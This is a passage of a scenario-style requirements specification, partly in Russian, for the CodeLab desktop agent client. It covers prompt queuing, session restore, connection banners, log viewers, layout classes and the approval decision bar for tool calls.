#### Scenario: A background session's status updates as its turn progresses
- **WHEN** a non-active session's prompt turn starts running, requests an approval, or completes
- **THEN** the sessions sidebar reflects that session's current status without requiring the user to switch to it first

### Requirement: Messages queue instead of failing when the session is busy
CodeLab SHALL queue a submitted prompt client-side, without attempting to send it and without losing the typed text, when the active session cannot currently accept a new prompt turn (a turn is running or an approval is pending), instead of attempting the send and showing a failure.

#### Scenario: Submitting while awaiting approval queues the message
- **WHEN** user submits a prompt while the active session has a pending approval
- **THEN** CodeLab adds the message to the queue instead of sending it, and does not show a "prompt failed" entry in the transcript

#### Scenario: Submitting while a turn is running queues the message
- **WHEN** user submits a prompt while the active session's turn is still running
- **THEN** CodeLab adds the message to the queue instead of attempting to send it

#### Scenario: Submitting while the session is free sends immediately
- **WHEN** user submits a prompt while the active session is idle or active
- **THEN** CodeLab sends it immediately, unchanged from current behavior

#### Scenario: Another session being busy does not queue a message for the active session
- **WHEN** user submits a prompt in the active session while a *different* session has a turn running or an approval pending
- **THEN** CodeLab sends the message immediately, exactly as it would if no other session existed — only the active session's own busy state can cause queuing

### Requirement: Queued messages panel with per-item and bulk actions
CodeLab SHALL show a queued-messages panel, visible only when the queue is non-empty, offering Edit, Delete, and Send Now per item, and Clear All for the whole queue.

#### Scenario: Editing a queued message
- **WHEN** user selects Edit on a queued message
- **THEN** CodeLab removes it from the queue and places its text back into the prompt composer for editing

#### Scenario: Deleting a queued message
- **WHEN** user selects Delete on a queued message
- **THEN** CodeLab removes it from the queue without sending it

#### Scenario: Send Now attempts immediate delivery
- **WHEN** user selects Send Now on a queued message and the session is currently free
- **THEN** CodeLab sends that message immediately, out of FIFO order

#### Scenario: Send Now during a race returns the message to the queue
- **WHEN** user selects Send Now on a queued message but the session is still busy at that moment
- **THEN** CodeLab returns the message to its place in the queue without showing an error

#### Scenario: Clear All empties the queue
- **WHEN** user selects Clear All
- **THEN** CodeLab removes every queued message without sending any of them

### Requirement: Queue drains automatically when the session becomes free
CodeLab SHALL automatically send the oldest queued message once the active session returns to an idle/active state, without requiring user action.

#### Scenario: Oldest message sends automatically after the block clears
- **WHEN** the active session's turn completes or its pending approval is resolved, and the queue is non-empty
- **THEN** CodeLab automatically sends the oldest queued message

#### Scenario: A background session's own queue drains when its own turn completes
- **WHEN** a non-active session's turn completes or its pending approval is resolved while a different session is active, and that non-active session's own queue is non-empty
- **THEN** CodeLab automatically sends that session's oldest queued message, without requiring the user to switch to it first

### Requirement: Debug log — отдельная докнутая панель, не вложенная в Inspector
CodeLab SHALL отображать протокольные записи текущей сессии и debug log в панели Protocol дока инструментов как два отдельных раздела одной панели, а не как постоянные колонки workbench.

#### Scenario: Панель Protocol открывается переключателем
- **WHEN** пользователь нажимает переключатель Protocol в app bar или выбирает `/logs` в палитре
- **THEN** в доке открывается и становится активной вкладка Protocol

#### Scenario: Разделы панели не дублируют друг друга
- **WHEN** пользователь просматривает панель Protocol
- **THEN** раздел протокола показывает только approval/tool-call/protocol-записи текущей сессии, а раздел debug log — только structured-log события; ни одна запись не показана в обоих разделах

#### Scenario: Раздел debug log даёт поиск и фильтр по уровню
- **WHEN** пользователь вводит текст в поле поиска или выбирает минимальный уровень в разделе debug log
- **THEN** список записей ограничивается совпадающими по тексту и/или не ниже выбранного уровня

#### Scenario: Кнопка Expand открывает полноэкранный log viewer
- **WHEN** пользователь нажимает кнопку "Expand" в разделе debug log
- **THEN** CodeLab открывает тот же полноэкранный log viewer, что и раньше

#### Scenario: Селектор типа фильтрует записи по категории, когда их несколько
- **WHEN** в разделе debug log одновременно присутствуют записи двух и более категорий (например, `application` и `protocol`)
- **THEN** CodeLab показывает селектор по типу записи, позволяющий ограничить список одной категорией или снять ограничение

### Requirement: Полноэкранный log viewer — master-detail
CodeLab SHALL открывать полноэкранный log viewer (список записей слева, detail-панель выбранной записи справа) поверх притемнённого workbench при вызове через `/logs` или кнопку "Expand" докнутой панели, и SHALL закрывать его без потери состояния workbench под ним.

#### Scenario: Detail-панель показывает correlation-поля выбранной записи
- **WHEN** пользователь выбирает запись в списке полноэкранного log viewer
- **THEN** detail-панель показывает событие целиком, включая доступные correlation-поля (`component`, `category`, `connection_generation`, и где применимо `session_id`/`request_id`/`tool_call_id`) в виде key/value

#### Scenario: Закрытие возвращает к workbench без изменений
- **WHEN** полноэкранный log viewer открыт, и пользователь нажимает кнопку закрытия либо `Esc`
- **THEN** CodeLab скрывает log viewer и возвращает workbench к состоянию, в котором он был до открытия (активная сессия, transcript, docked-панели не меняются)

#### Scenario: Секреты замаскированы и в списке, и в detail-панели
- **WHEN** запись, отображаемая в полноэкранном log viewer (в списке или в detail-панели), содержит значение, подпадающее под существующее правило редактирования секретов
- **THEN** это значение показано замаскированным — то же самое правило, что уже действует для docked debug-лога (см. `approval-safety`, требование "Редактирование секретов"), не дублируется отдельным набором правил

### Requirement: Отменяемый ход в workbench
CodeLab SHALL показывать вызов инструмента, отменённый клиентом при отправке `session/cancel`, со статусом «Cancelled», а не «Failed» или «Running». Пока ход «отменяется», сессия SHALL считаться занятой: кнопка отмены недоступна, очередь промптов не отправляет следующее сообщение до ответа агента на `session/prompt`.

#### Scenario: Отменённый вызов показан как Cancelled
- **WHEN** пользователь отменяет ход, пока вызов инструмента выполняется
- **THEN** запись вызова в transcript показывает статус «Cancelled»

#### Scenario: Очередь ждёт ответа агента на отмену
- **WHEN** пользователь отменяет ход, в очереди сессии есть сообщение, а агент ещё не ответил на `session/prompt`
- **THEN** CodeLab не отправляет сообщение из очереди и не показывает кнопку отмены; после ответа агента сообщение отправляется автоматически

### Requirement: Лента transcript следует за хвостом
CodeLab SHALL держать в виду конец ленты transcript, пока пользователь находится у её низа: когда в ленту дописываются или меняются записи, лента SHALL прокручиваться к новому низу. Если пользователь прокрутил ленту вверх, чтобы читать историю, CodeLab SHALL NOT менять позицию прокрутки.

#### Scenario: Новые записи у низа ленты остаются видимыми
- **WHEN** пользователь находится у низа ленты (не дальше 80 px) и в ленту приходят новые записи — ответ агента, карточки tool call, результаты
- **THEN** после перерисовки лента прокручена к новому низу без анимации, и последняя запись видна

#### Scenario: Чтение истории не прерывается
- **WHEN** пользователь прокрутил ленту вверх дальше 80 px от низа, и в ленту приходят новые записи
- **THEN** позиция прокрутки не меняется

#### Scenario: Возврат к низу возобновляет следование
- **WHEN** пользователь, читавший историю, прокрутил ленту обратно к низу (не дальше 80 px), и в ленту приходят новые записи
- **THEN** лента снова прокручивается к новому низу

#### Scenario: Автопрокрутка к approval сохраняется
- **WHEN** вместе с новыми записями появляется новый pending approval
- **THEN** CodeLab прокручивает ленту к approval так же, как требует сценарий «Лента автоскроллится к новому approval»

### Requirement: Sessions sidebar lists the project's sessions from the agent
When the agent declares `sessionCapabilities.list`, the sessions sidebar SHALL show the project's sessions from `session/list` after each successful start or restart of the agent and after the project is switched while the agent runs (requirement «Агент стартует сам»; design.md change `require-project-folder`, D15), after the sessions opened in this run and without duplicates. A session that is not open yet SHALL be shown with its title from the agent and a "not loaded" status. When the agent reports more sessions, the sidebar SHALL offer a "Load more sessions" control that fetches the next page.

#### Scenario: Sessions from the agent's journal
- **WHEN** the agent starts for the selected project, and its journal holds two sessions for that project
- **THEN** the sidebar lists both sessions with their titles and a "not loaded" status

#### Scenario: More sessions than one page
- **WHEN** the agent's first `session/list` page has a `nextCursor`
- **THEN** the sidebar shows "Load more sessions", and selecting it appends the next page

### Requirement: Selecting a not-loaded session restores its transcript
Focusing a session that is not loaded in the current connection — "not loaded" or "detached" — SHALL start the window's agent if it is not running (requirement «Агент стартует сам»), load the session via `session/load` with the session's own `cwd`, and make it the active session with the transcript replayed by the agent. A running agent SHALL NOT be restarted for this, whatever the session's directory. If starting the agent or loading fails, the previously active session SHALL stay active, the sidebar row SHALL keep its status, and the failure SHALL be recorded as a diagnostic. Exception: when the running agent did not declare `loadSession`, focusing a "detached" session SHALL show it read-only with its transcript and the detached notice, as before this change, without a `session/load` attempt and without a diagnostic; when the agent is not running, the focus starts it first and then applies the same rule (design.md change `require-project-folder`, Q26 (a)).

#### Scenario: Loading a session from the sidebar
- **WHEN** the user selects a "not loaded" session
- **THEN** the session becomes active and its transcript shows the user prompts and agent replies the agent replayed

#### Scenario: Loading fails
- **WHEN** the agent answers `session/load` with an error
- **THEN** the active session does not change, the sidebar row keeps its status, and a diagnostic records the failure

#### Scenario: Detached session with an agent without loadSession
- **WHEN** the running agent did not declare `loadSession`, and the user selects a "detached" session
- **THEN** the session becomes active and shows its transcript with the detached notice, no `session/load` is sent, no diagnostic is recorded, and prompts to it still fail without reaching the agent

#### Scenario: Session of another folder loads into the running agent
- **WHEN** the agent runs with process root `/work/a`, a turn is running in a session of `/work/a`, and the user selects a "detached" session with `cwd` `/work/b`
- **THEN** the agent is not restarted, the turn in `/work/a` continues, and the session is loaded via `session/load` with `cwd` `/work/b`, becomes active and accepts prompts again

### Requirement: Workbench restores sessions after reconnect and restart
After "Restart agent" (or "Reconnect" for WebSocket), the workbench SHALL reload the open sessions so the active session's transcript matches the agent's replay; a session the agent cannot restore SHALL be shown as "detached" with a notice in its transcript, and prompts to it SHALL fail without reaching the agent. After an app restart, the workbench SHALL select the project from the previous run, which starts the agent (requirement «Агент стартует сам»); on that first start it SHALL list the project's sessions and load the previously active session if its `cwd` is the snapshot's project. A previously active session with another `cwd` SHALL NOT be loaded automatically: it stays a "not loaded" row that the user can open explicitly. When the agent cannot restore the active session, the workbench SHALL start a new session in the project with a notice explaining why. A previous-run project that is a filesystem root (for example `/`, written by versions that substituted the process directory for an unselected project) SHALL NOT be selected: the workbench SHALL record a warning diagnostic, start without a project and without an agent, as it does for a previous-run project whose folder no longer exists (design.md change `require-project-folder`, D10, D16, D19).

#### Scenario: Reconnect reloads the active session
- **WHEN** a session with a finished turn is active and the user presses "Restart agent" with an agent that supports `session/load`
- **THEN** after the restart the active session shows the same transcript, rebuilt from the agent's replay

#### Scenario: Restart restores the previous session
- **WHEN** the user restarts the app after working in a session in `/work/app`
- **THEN** `/work/app` is the selected project, the agent starts in `/work/app` without any Connect action, the previously active session is loaded with its transcript, and the sidebar lists the project's sessions

#### Scenario: The agent cannot restore sessions
- **WHEN** after a restart the window's agent has no `loadSession`
- **THEN** the workbench starts a new session in the previous project and its transcript shows "The agent cannot restore sessions; a new session was started."

#### Scenario: Snapshot project at the filesystem root is not restored
- **WHEN** the workspace snapshot of the previous run has `projectDirectory` `/` and an active open session with `cwd` `/`, and the app starts
- **THEN** no project is selected, no agent is started, a warning diagnostic names the reason, and after the user selects a project the snapshot's sessions are neither loaded nor written to the next snapshot

#### Scenario: Active session with root cwd under a real project
- **WHEN** the workspace snapshot has `projectDirectory` `/work/app` and the active open session `s2` with `cwd` `/`, and the app starts
- **THEN** `/work/app` is the selected project, the agent starts in `/work/app`, no `session/load` or `session/new` is sent for `s2`, `s2` is listed as "not loaded", and the session pane shows the start screen; selecting `s2` asks for confirmation (requirement «Подтверждение открытия сессии в корне диска») and, after `Open`, loads it with `cwd` `/` without restarting the agent

### Requirement: Connection banner above a non-empty transcript
When the transcript of the active session is not empty and the connection is `lost`, `failed` or `reconnecting`, the workbench SHALL show a banner above the transcript that states the connection status and its reason. The banner SHALL offer Retry and Connection settings while the connection is `lost` or `failed`, and SHALL show progress without a Retry action while it is `reconnecting`. After `failed`, Retry SHALL repeat the intent that started the agent; after `lost`, Retry SHALL start the agent again with the window's profile and the previous process root, and the open sessions SHALL be reloaded as after "Restart agent" (requirement «Агент стартует сам», trigger 4; design.md change `require-project-folder`, D13, D18). The banner SHALL NOT be dismissible and SHALL disappear when the connection becomes `connected`. When no session is in focus or its transcript is empty, the workbench SHALL show the start screen or the start failure screen instead of the banner (requirement «Empty session after connecting»).

#### Scenario: The agent process exits during a session
- **WHEN** the active session's transcript has entries and the agent process exits unexpectedly
- **THEN** a "Connection to the agent lost" banner with the reason, a Retry action and a Connection settings action appears above the transcript, and the transcript entries stay visible

#### Scenario: Retry from the banner
- **WHEN** the connection is `lost` and the user selects Retry in the banner, and the start succeeds
- **THEN** the agent starts once with the window's profile, the banner shows progress without the Retry action while starting, and disappears once the connection is `connected`; the active session is loaded again via `session/load`

#### Scenario: Retry from the banner fails
- **WHEN** the user selects Retry in the banner and the attempt fails
- **THEN** the banner shows "Could not connect to the agent" with the failure reason and offers Retry again

#### Scenario: Empty transcript shows the failure screen
- **WHEN** the start of the agent fails while the active session's transcript is empty or no session is in focus
- **THEN** the session pane shows the start failure screen with the reason and Retry, and no banner

### Requirement: Failed turn notice with Retry
A failed prompt turn SHALL be shown in the transcript as a notice whose title describes the failure class and whose body is the agent's message, with the raw error text available only in collapsed details. The title SHALL follow the agent's `errorClass`:

| `errorClass` | Title |
|---|---|
| `auth` | The agent could not sign in to the model provider |
| `network`, `timeout`, `server` | The model provider is unavailable |
| `rateLimited` | The model provider's rate limit was reached |
| `overflow` | The conversation is too long for the model |
| a turn interrupted by a lost connection | The connection to the agent was lost |
| any other or no class | The agent could not complete the turn |

The notice of the session's last turn SHALL offer a Retry action exactly when the session can retry it (`SessionView.canRetry`, requirement "Повтор сорвавшегося хода" of `acp-client-kit`) and the connection is `connected`. Selecting Retry SHALL send the same prompt as a new turn.

#### Scenario: Provider authentication failure
- **WHEN** the agent answers the prompt as in fixture `acp/prompt-failed-provider-auth`
- **THEN** the transcript shows "The agent could not sign in to the model provider" with the body "401 Unauthorized from openai: check api_key_env", no Retry action, and the raw error text only inside collapsed details

#### Scenario: Retry after a provider outage
- **WHEN** the last turn failed with `errorClass: "server"` and `retryable: true`, and the user selects Retry
- **THEN** the same prompt is sent as a new turn, and the failed turn with its notice stays in the transcript above it

#### Scenario: Turn interrupted by a lost connection
- **WHEN** the agent process exits while a turn is running
- **THEN** the turn's notice reads "The connection to the agent was lost" without a Retry action, and the connection banner offers Reconnect

#### Scenario: Error from a third-party agent
- **WHEN** an agent without the CodeLab extension answers the prompt with a JSON-RPC error without `data`
- **THEN** the notice reads "The agent could not complete the turn" with the JSON-RPC error message as its body, and offers Retry

### Requirement: Layout class follows the window width
CodeLab SHALL choose the workbench layout class only from the window width in logical pixels (`dart-agent-and-clients` §12.8.3):

| Class | Window width |
|---|---|
| phone | < 641 |
| narrow | 641–899 |
| medium | 900–1279 |
| wide | ≥ 1280 |

In `wide` the sidebar and the tool dock SHALL be columns. In `medium` the sidebar SHALL be a column that Cmd/Ctrl+B collapses to icons, and the dock SHALL slide over the transcript. In `narrow` and `phone` both SHALL slide over the content. Changing the class SHALL NOT lose the composer text or the transcript scroll position.

#### Scenario: Thresholds
- **WHEN** the window is 640, 641, 899, 900, 1279 and 1280 px wide
- **THEN** the layout class is phone, narrow, narrow, medium, medium and wide respectively

#### Scenario: Dock as a column only when wide
- **WHEN** the Plan pane is open and the window is resized from 1280 px to 1279 px
- **THEN** the dock changes from a column beside the session pane to a panel that slides over the transcript

#### Scenario: Resizing keeps the draft and the scroll position
- **WHEN** the composer holds unsent text, the transcript is scrolled up, and the window is resized from 1440 px to 820 px and back
- **THEN** the composer holds the same text and the transcript keeps its scroll position

### Requirement: App bar with palette search and connection badge
CodeLab SHALL show an app bar with the app name, a search field labelled "Search or run a command" with the palette shortcut, toggles for the available tool panes, and a connection badge. Activating the search field SHALL open the command palette. The badge SHALL show the connection status; while the connection is lost or failed it SHALL offer Retry, which does the same as Retry in the connection banner (requirement «Connection banner above a non-empty transcript»). The badge SHALL NOT offer Connect in any state: the agent starts by the workbench triggers (requirement «Агент стартует сам»; design.md change `require-project-folder`, D18). The app bar SHALL NOT show the agent binary path. While no project is selected and the agent has not started (connection status idle or disconnected), the badge SHALL read `No project · agent not started` with the tooltip `No project is selected, so no agent is running` instead of the status name (frame 11a; design.md change `add-empty-project-screen`, D8); in every other case the badge shows the connection status as above.

#### Scenario: Search field opens the palette
- **WHEN** the user clicks the "Search or run a command" field
- **THEN** the command palette opens with focus in its search box

#### Scenario: Badge offers Retry after a lost connection
- **WHEN** the agent process exits while connected
- **THEN** the badge reads "Connection lost" and offers Retry, and choosing Retry starts the agent again

#### Scenario: Badge while connected
- **WHEN** the connection is established
- **THEN** the badge reads "Connected", no Connect button is shown, and the profile and transport are available in the badge tooltip

#### Scenario: Badge before the agent starts
- **WHEN** no project is selected and the agent has not started
- **THEN** the badge reads `No project · agent not started`, its tooltip is `No project is selected, so no agent is running`, and no Connect button is shown

#### Scenario: Badge after a folder is chosen
- **WHEN** no project is selected, the badge reads `No project · agent not started`, and the user chooses the folder `/work/app` in "Open folder…"
- **THEN** while the agent starts the badge shows the connecting status, and `No project · agent not started` is no longer shown

### Requirement: Sessions sidebar grouped by project
The sessions sidebar SHALL show, from top to bottom, "New session" with its shortcut, a filter field, a "Projects" section with one group per project followed by "Open folder…" with the Cmd/Ctrl+O shortcut hint, and "Settings" at the bottom. With no project groups (no project selected, no recent projects and no open sessions) the "Projects" section SHALL show `No recent projects yet.` above "Open folder…" (frame 11a; design.md change `add-empty-project-screen`, D9). The compact (icon-only) sidebar keeps "Open folder…" as an icon button next to "Settings" without a shortcut hint. The selected project's group SHALL be expanded and list its sessions with their status and "Load more sessions"; recent projects SHALL be collapsed groups named after the folder. A session opened in this run SHALL be listed in the group of the project whose path equals its `cwd` (exact string match): one agent serves sessions of any folder, and a session of another project keeps running after the project is switched. A recent project's group that holds open sessions SHALL list them with their live status, and stays collapsed only while none of them is running, waiting for approval or failed; it SHALL NOT list that project's `session/list` rows until the project is selected. An open session whose `cwd` matches no group SHALL be listed in the selected project's group with its folder as the subtitle (design.md change `require-project-folder`, Q23 (a)). The filter SHALL narrow the listed sessions by title.

#### Scenario: Groups by project
- **WHEN** the selected project has three sessions and two other projects are in the recent list
- **THEN** the sidebar shows the selected project's group expanded with three sessions and two collapsed groups for the other projects

#### Scenario: Filtering sessions
- **WHEN** the user types "reconnect" into the filter field
- **THEN** only sessions whose title contains "reconnect" (case-insensitive) stay listed

#### Scenario: Session status in the sidebar
- **WHEN** a listed session is running a turn, waiting for approval, failed or not loaded
- **THEN** its row shows the matching status, as in "Sessions sidebar shows live status for background sessions"

#### Scenario: Running session of another project after switching
- **WHEN** a turn is running in a session with `cwd` `/work/a`, `/work/a` is a recent project, and the user selects the project `/work/b`
- **THEN** the `b` group lists `/work/b`'s sessions, the `a` group is expanded and lists the running session with its status, and the session is not listed under `b`

#### Scenario: Open session without its project group
- **WHEN** the selected project is `/work/app` and a session with `cwd` `/work/tools` (not a recent project) is open
- **THEN** the session is listed in the `app` group with the subtitle `/work/tools`

#### Scenario: No projects yet
- **WHEN** no project is selected, the recent projects list is empty, and the platform is Linux
- **THEN** the "Projects" section shows `No recent projects yet.`, followed by "Open folder…" with the hint `Ctrl+O`; "Settings" stays at the bottom

#### Scenario: Open folder… follows the project groups
- **WHEN** a project is selected and two other projects are in the recent list
- **THEN** "Open folder…" is listed right after the last project group inside the "Projects" section, and `No recent projects yet.` is not shown

### Requirement: Tool dock with closable pane tabs
CodeLab SHALL host tool panes in a dock on the right, with one closable tab per open pane. Each available pane SHALL have a toggle in the app bar that opens it, makes it active, or closes it when it is already active. With no open panes the dock SHALL NOT be shown. The open panes, the active pane and the dock width SHALL persist across restarts. Whether a pane is available SHALL be decided by that pane's own predicate (its data source exists in this window and for the current connection); a pane without data SHALL NOT be offered. An unavailable pane SHALL have no toggle and no tab, but SHALL stay in the saved layout and SHALL reappear when its predicate becomes true again. The Plan and Protocol panes are always available; the Files pane follows `workspace-file-browser` (design.md change `add-file-preview-and-tree`, D7).

#### Scenario: Opening and closing a pane
- **WHEN** the user clicks the Plan toggle, then closes the Plan tab
- **THEN** the dock appears with the Plan tab active, and after closing it the dock disappears and the transcript takes the width

#### Scenario: Two panes as tabs
- **WHEN** Plan and Protocol are both open
- **THEN** the dock shows two tabs, and clicking a tab makes that pane active

#### Scenario: Open panes survive a restart
- **WHEN** Plan and Protocol are open with Protocol active, and CodeLab is restarted
- **THEN** the dock opens with both tabs and Protocol active

#### Scenario: Unavailable pane is hidden but kept in the layout
- **WHEN** Files and Plan are open with an embedded-agent connection, and the window switches to a WebSocket profile, then back to the embedded agent
- **THEN** while on the WebSocket profile the dock shows only Plan and there is no Files toggle, and after switching back the Files tab is shown again

### Requirement: Session pane header
The session pane SHALL have a header with the session title, a project chip named after the folder of the session's `cwd` with the full path as a tooltip, and a mode chip when the agent publishes a mode config option. While the session is busy, the header SHALL show a turn state chip: "Turn running" with a progress indicator while a turn runs, "Waiting for approval" while the turn waits for a pending approval, and "Cancelling…" while a cancellation awaits the agent's answer. An idle, failed or detached session SHALL show no turn state chip.

#### Scenario: Header of an active session
- **WHEN** a session titled "Fix reconnect race" in `/work/codelab-app` is active and the agent publishes the mode "standard"
- **THEN** the header shows "Fix reconnect race", a "codelab-app" chip with the tooltip `/work/codelab-app`, and a "standard" chip

#### Scenario: Turn state in the header
- **WHEN** the active session runs a turn, then the turn waits for an approval, then the user approves and the turn ends
- **THEN** the header shows "Turn running", then "Waiting for approval", then "Turn running", and no turn state chip after the turn ends

### Requirement: Transcript reads as a conversation
The transcript SHALL be laid out as a conversation in a column centred in the session pane, at most 760 px wide, without a frame around the transcript. A user message SHALL be a bubble aligned to the right, at most 78% of the column width, without a "You" label. An agent reply SHALL be rendered markdown in the column (requirement "Markdown в ответе агента") without a card and without an "Agent" label. Consecutive rows SHALL be separated by spacing, not by per-row cards.

#### Scenario: A prompt and its reply
- **WHEN** the user sends "Render replies as markdown" and the agent answers "I'll split the transcript into typed rows."
- **THEN** the transcript shows the prompt in a right-aligned bubble and the answer as a paragraph below it, and neither row shows a "You" or "Agent" label

#### Scenario: Wide window keeps a readable column
- **WHEN** the session pane is 1200 px wide
- **THEN** the transcript column is 760 px wide and centred in the pane

### Requirement: Model thoughts in a collapsible block
Each `agent_thought_chunk` segment SHALL be shown as a thought block distinct from the agent reply: muted text, a thought icon and a header. While the thought is streaming (it is the last transcript item of a running turn), the header SHALL read "Thinking…" with a progress indicator and the block SHALL be expanded. After the thought ends, the header SHALL read "Thoughts" and the block SHALL collapse to its header without animation. The user's manual choice to expand or collapse a block SHALL win over these defaults and SHALL survive the row scrolling out of view. In `verbose` the block SHALL be expanded by default; in `summary` it SHALL stay a one-line header. Thought text SHALL be shown as is, without markdown, and SHALL NOT be part of the agent reply.

#### Scenario: Thought while streaming
- **WHEN** the agent streams `agent_thought_chunk` updates and nothing else yet
- **THEN** the transcript shows an expanded block headed "Thinking…" with a progress indicator and the thought text

#### Scenario: Thought collapses when the reply starts
- **WHEN** after the thought the agent streams `agent_message_chunk` updates
- **THEN** the thought block collapses to its header "Thoughts", and the reply is shown below it as rendered markdown

#### Scenario: The user's choice wins
- **WHEN** the user expands a finished thought block, scrolls it out of view and back
- **THEN** the block is still expanded

### Requirement: Tool call as a one-line row
Each tool call SHALL be shown as one row with a status glyph, a label by the tool call's kind, a detail and a status tag, following `ToolRowView` from the client kit (requirement "Строка инструмента без сырого JSON" of `acp-client-kit`). The row SHALL NOT show the protocol kind name or raw JSON. The status tag SHALL read "Queued", "Running", "Done", "Failed" or "Cancelled" by the tool call status. A row with a secondary line or text output SHALL be expandable: expanded, it SHALL show the secondary line and the text output. In `summary` and `normal` rows SHALL be collapsed by default and in `verbose` expanded; a row with a pending approval SHALL always be expanded.

While the tool call has a pending approval, its row SHALL show instead of the status tag the approval risk as a tag ("Read-only", "Local write", "Network", "Shell", "Destructive"), and its detail SHALL be the full subject of the request — the command for a tool call of kind `execute` — without truncation: the detail SHALL wrap up to three lines, and a longer detail SHALL offer "Show full command" that shows the rest in place.

#### Scenario: Completed read
- **WHEN** the agent reads `lib/main.dart` with a tool call of kind `read` that completes
- **THEN** the transcript shows one row "Read lib/main.dart" with the tag "Done", without the words `read` or `completed` and without its `rawInput`

#### Scenario: Command awaiting approval
- **WHEN** a tool call of kind `execute` with `rawInput.command` "echo running tests" waits for an approval with the risk `shell`
- **THEN** its row reads "Run echo running tests" with the tag "Shell" and is expanded with the decision bar

#### Scenario: Long command is never cut before the decision
- **WHEN** a tool call of kind `execute` waits for an approval with a command longer than three lines of the row
- **THEN** the row shows the first three lines of the command and "Show full command", and choosing "Show full command" shows the whole command without an ellipsis

#### Scenario: Failed call shows its reason when expanded
- **WHEN** a tool call fails with the text content "File not found: lib/main.dart" and the user expands its row
- **THEN** the row shows "File not found: lib/main.dart" below its header

### Requirement: Approval card inside the tool call row
A pending approval SHALL be shown inside its tool call row as one decision bar at the bottom of the row, not as a separate card. The decision bar SHALL separate the decision from its scope: it SHALL show an "Allow" button and a "Reject" button and a scope selector with "Only this time" and "Always". A button SHALL answer with the agent's option of its decision and the selected scope:

| Button | Only this time | Always |
|---|---|---|
| Allow | `allow_once` | `allow_always` |
| Reject | `reject_once` | `reject_always` |

The scope SHALL default to "Only this time" when the request has an `allow_once` or `reject_once` option, and to "Always" otherwise. A scope SHALL be offered only when the request has an option of that scope. A button whose decision has no option in the selected scope SHALL be disabled and SHALL say that the agent offers no such option. The "Always" scope SHALL show the names of the agent's `allow_always` and `reject_always` options. The scope SHALL apply to this approval only. Each button of the active approval SHALL show the shortcut of the option it answers with, when that option has one; option shortcuts SHALL be as in requirement "Approval options are rendered and bound to shortcuts by kind" and SHALL work whatever scope is selected and wherever keyboard focus is on the workbench, under the conditions of requirement «Ответ на одобрение сочетанием с любого места рабочего места». The decision bar SHALL NOT take keyboard focus by itself. The decision bar SHALL NOT repeat the command shown in the row header and SHALL NOT carry a title. The reason, when present, SHALL be shown as a muted line above the decision bar. The raw input SHALL stay collapsed until the user chooses "View raw input" in the decision bar, as in requirement "Approval panel offers a collapsed raw input view". After the decision the decision bar SHALL be replaced by a tag in the tool call row naming the outcome, as in requirement "Паттерны взаимодействия agent workbench".

#### Scenario: Command decision bar
- **WHEN** a tool call of kind `execute` with command "echo running tests" asks for permission with the four standard option kinds
- **THEN** the bottom of its row shows "Allow", "Reject" and the scope "Only this time", and the command is not shown a second time

#### Scenario: Allow once by default
- **WHEN** the user chooses "Allow" without changing the scope
- **THEN** CodeLab selects the `allow_once` option for that approval

#### Scenario: Always is an explicit scope
- **WHEN** the user selects the scope "Always" and chooses "Reject"
- **THEN** CodeLab selects the `reject_always` option for that approval

#### Scenario: A scope without an option for a decision
- **WHEN** a request offers only `allow_always` and `reject_once` and the scope is "Only this time"
- **THEN** "Reject" is enabled, "Allow" is disabled and says the agent offers no such option, and selecting "Always" enables "Allow" and disables "Reject"

#### Scenario: Shortcut of an always option
- **WHEN** the approval is active for more than 500 ms, its decision bar is visible, keyboard focus is in the composer, the scope is "Only this time" and the user presses the shortcut of `allow_always`
- **THEN** CodeLab selects the `allow_always` option for that approval

#### Scenario: Shortcut hints of the always scope
- **WHEN** the platform is macOS, the scope is "Always" and the request offers `allow_always` and `reject_always`
- **THEN** the "Allow" button shows `⌥⌘Y` and the "Reject" button shows `⌥⇧⌘Z`

#### Scenario: Decision leaves a tag
- **WHEN** the user chooses "Allow" with the scope "Only this time" and the agent's `allow_once` option is named "Allow once"
- **THEN** the decision bar disappears and the tool call row shows a tag "Allow once" with a success tone

### Requirement: Transcript notices by severity
Transcript notices SHALL be styled by their kind. A failed turn notice SHALL be an error InfoBar, as in requirement "Failed turn notice with Retry". A detached session notice SHALL be a warning InfoBar. A notice that a new session was started instead of a restored one, a session reconnection notice, and an empty turn notice SHALL be a neutral one-line note with an info icon. Only the failed turn notice SHALL use the error tone.

#### Scenario: New session after a failed restore
- **WHEN** the agent cannot restore sessions and the workspace starts a new session with a notice
- **THEN** the transcript shows "The agent cannot restore sessions; a new session was started." as a neutral note, not as an error

### Requirement: Empty session after connecting
Without a session in focus, the session pane SHALL show a start screen instead of a connection screen: without a selected project — the screen of requirement «Экран без выбранного проекта» with "Open folder…" (key `start-open-project`; design.md change `add-empty-project-screen`, D1, D2); with a selected project — `Start a new session in <folder name>.` and "New session" (key `start-new-session`), with the progress text `Starting <profile title>…` while the agent starts. The session pane header SHALL NOT show a subtitle while no session is in focus (D11). When a session is in focus and has no transcript items and the agent runs, the session pane SHALL show an empty state inviting the user to send the first message. When starting the agent fails, the session pane SHALL show the failure reason with "Retry", which repeats the intent that started the agent, and "Connection settings". The workbench SHALL NOT offer a Connect action (design.md change `require-project-folder`, D18).

#### Scenario: New session while connected
- **WHEN** the agent runs and the user creates a new session
- **THEN** the session pane shows the empty state with the composer focused, and no Connect button

#### Scenario: Start screen without a project
- **WHEN** no project is selected and no session is in focus
- **THEN** the session pane shows `open-project-screen` with "Open folder…" (`start-open-project`), the text `Open a project to start a session.` is not shown anywhere in the window, and no Connect button

#### Scenario: Start screen with a project
- **WHEN** the project `/work/app` is selected and no session is in focus
- **THEN** the session pane shows `Start a new session in app.` and "New session" (`start-new-session`); pressing it creates a session with `cwd` `/work/app`

#### Scenario: Agent start fails
- **WHEN** the user selects a project with the embedded agent and an invalid `config.yaml`
- **THEN** the session pane shows the config problems and "Retry"; after the config is fixed, "Retry" (or any other start trigger) starts it

### Requirement: Тип подключения «Встроенный агент»
Встроенный агент SHALL быть первой строкой списка профилей страницы настроек «Connection» (spec app-settings «Список профилей на странице «Connection»»), а не типом в форме подключения (design.md change `add-app-settings-shell`, D6). У строки нет полей. Рабочая папка выбирается «Open Project», как у других профилей. Конфигурация агента берётся из `$CODELAB_HOME/config.yaml` и проектного `.codelab/config.yaml`, ключи — из хранилища секретов агента.

Подключение SHALL строить профиль `ConnectionProfile.embedded(id: 'embedded', hostProfile: 'embedded-app-desktop')`, а транспорт ему даёт `EmbeddedTransportResolver`, зарегистрированный в composition root (`apps/codelab_desktop/lib/app/`). Виджеты и Cubit-ы НЕ SHALL импортировать `package:codelab_embedded/io.dart`.

